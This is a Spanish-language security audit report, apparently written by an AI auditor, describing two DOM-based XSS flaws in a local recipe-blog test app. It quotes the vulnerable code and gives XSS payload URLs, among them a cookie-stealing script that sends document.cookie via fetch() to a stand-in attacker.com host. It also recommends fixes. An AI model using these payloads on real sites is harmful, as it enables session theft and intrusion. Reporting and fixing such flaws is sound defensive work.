# Informe de Análisis de Seguridad - Cross-Site Scripting (XSS)

**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-30  
**Analista:** Copilot Security Audit  
**Tipo de análisis:** Cross-Site Scripting (XSS)

---

## Resumen Ejecutivo

Se identificaron **2 vulnerabilidades XSS** en la aplicación web "Blog de Recetas" alojada en `http://web.dev.local:8082`. Ambas son de tipo **DOM-based XSS** ya que la lógica de inyección ocurre en el lado del cliente mediante JavaScript sin sanitización. Una de ellas permite persistencia a través de `localStorage` (XSS almacenado en cliente).

---

## Vulnerabilidades Encontradas

### VUL-001: DOM-based XSS en el parámetro `search`

**Severidad:** Alta  
**Tipo:** DOM-based XSS (Reflected)  
**Parámetro afectado:** `search` (GET)  

**Descripción:**  
El parámetro `search` es leído directamente desde la URL mediante `URLSearchParams` e insertado sin sanitización en `document.write()`. Esto permite a un atacante inyectar HTML/JavaScript arbitrario que se ejecuta en el navegador de la víctima.

**Código vulnerable:**
```javascript
const searchTerm = urlParams.get('search');
// ...
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

**Payload de explotación:**
```
http://web.dev.local:8082/?search=<script>alert('XSS')</script>
```

**Payload alternativo (evasión de filtros de script):**
```
http://web.dev.local:8082/?search=<img src=x onerror=alert('XSS')>
```

**Impacto:**  
- Robo de cookies/sesión mediante `document.cookie`
- Redirección a sitios maliciosos
- Defacement de la página
- Captura de credenciales (phishing)

---

### VUL-002: DOM-based Stored XSS en el sistema de comentarios

**Severidad:** Alta  
**Tipo:** DOM-based Stored XSS (via localStorage)  
**Parámetros afectados:** `name` y `comment` (GET)  

**Descripción:**  
Los comentarios se almacenan en `localStorage` del navegador sin sanitización y se renderizan posteriormente mediante `document.write()` sin escapar el contenido HTML. Un atacante que logre que la víctima visite una URL maliciosa puede almacenar un payload XSS persistente en su navegador.

**Código vulnerable:**
```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');
// Almacenado sin sanitización:
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));
// Renderizado sin sanitización:
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

**Payload de explotación:**
```
http://web.dev.local:8082/?name=Hacker&comment=<img src=x onerror=alert('XSS Almacenado')>
```

**Payload con robo de cookie:**
```
http://web.dev.local:8082/?name=Atacante&comment=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
```

**Impacto:**  
- XSS persistente para el usuario víctima (permanece en localStorage hasta que sea limpiado)
- Puede encadenar ataques de mayor complejidad

---

## Prueba de Explotación

Se verificó la vulnerabilidad VUL-001 mediante el siguiente request:

```
GET /?search=<script>alert(1)</script> HTTP/1.1
Host: web.dev.local:8082
```

El código fuente de la respuesta contiene:
```javascript
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

Donde `searchTerm` toma el valor del parámetro GET sin ningún proceso de sanitización, confirmando la inyección directa de código JavaScript.

---

## Recomendaciones

1. **Sanitizar entradas:** Usar funciones como `DOMPurify.sanitize()` o escapar caracteres especiales HTML (`<`, `>`, `"`, `'`, `&`) antes de insertar contenido en el DOM.

2. **Evitar `document.write()`:** Reemplazar por métodos seguros como `textContent` o `createElement` + `appendChild`.

3. **Usar `innerHTML` con precaución:** Si se necesita insertar HTML dinámico, sanitizar siempre el contenido primero.

4. **Content Security Policy (CSP):** Implementar cabeceras CSP para limitar la ejecución de scripts no confiables.

5. **Validación del lado servidor:** Aunque estas vulnerabilidades son DOM-based, implementar validación y sanitización también en el servidor.

**Ejemplo de código seguro:**
```javascript
// VULNERABLE:
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');

// SEGURO:
const p = document.createElement('p');
p.textContent = 'Resultados para: ';
const strong = document.createElement('strong');
strong.textContent = searchTerm;
p.appendChild(strong);
document.body.appendChild(p);
```

---

## Conclusión

La aplicación presenta múltiples vulnerabilidades XSS críticas debido al uso de `document.write()` con datos no sanitizados provenientes de parámetros URL y `localStorage`. Se recomienda corrección inmediata antes de desplegar en producción.

| ID | Tipo | Parámetro | Severidad | Explotable |
|----|------|-----------|-----------|------------|
| VUL-001 | DOM-based XSS Reflected | `search` | Alta | ✅ Sí |
| VUL-002 | DOM-based Stored XSS | `name`, `comment` | Alta | ✅ Sí |
